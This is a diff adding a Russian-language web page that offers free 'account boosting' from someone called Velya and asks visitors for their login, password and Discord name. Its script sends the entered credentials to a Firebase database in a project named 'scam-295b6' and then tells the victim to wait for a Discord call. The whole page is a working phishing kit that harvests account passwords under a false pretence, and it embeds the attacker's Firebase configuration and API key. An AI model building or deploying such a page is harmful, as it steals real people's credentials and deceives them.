@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Boost</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial;
+  background: linear-gradient(135deg, #667eea, #764ba2);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.box {
+  background: white;
+  padding: 25px;
+  border-radius: 20px;
+  width: 90%;
+  max-width: 350px;
+  text-align: center;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 12px;
+  background: #667eea;
+  color: white;
+  font-size: 16px;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border-radius: 12px;
+  border: 1px solid #ccc;
+}
+
+.hidden {
+  display: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+  <div id="start">
+    <h2>Прокачка акаунта от Вели</h2>
+    <button onclick="openForm()">Участвовать в прокачке аккаунта</button>
+  </div>
+
+  <div id="form" class="hidden">
+    <h2>Вход</h2>
+    <input id="login" placeholder="Логин">
+    <input id="password" type="password" placeholder="Пароль">
+    <input id="discord" type="text" placeholder="Дискорд">
+    <button onclick="send()">Отправить</button>
+    <p id="msg"></p>
+  </div>
+
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDJB_t11qSCThwg0d_EdLsPYYHZsVzv29I",
+  authDomain: "scam-295b6.firebaseapp.com",
+  databaseURL: "https://scam-295b6-default-rtdb.firebaseio.com",
+  projectId: "scam-295b6",
+  storageBucket: "scam-295b6.firebasestorage.app",
+  messagingSenderId: "81637226398",
+  appId: "1:81637226398:web:11e950fbfa952e0910488f",
+  measurementId: "G-PQTQJZ66NE"
+};
+
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// делаем функции глобальными
+window.openForm = function() {
+  document.getElementById("start").style.display = "none";
+  document.getElementById("form").style.display = "block";
+}
+
+window.send = function() {
+  const login = document.getElementById("login").value;
+  const password = document.getElementById("password").value;
+
+  if (!login || !password) {
+    document.getElementById("msg").innerText = "Заполни поля";
+    return;
+  }
+
+  push(ref(db, "users"), {
+    login: login,
+    password: password,
+    date: new Date().toString()
+  });
+
+  document.getElementById("msg").innerText = "Сохранено! Ожидайте пока Веля отправит званок в дискорд";
+}
+</script>
+
+</body>
+</html>
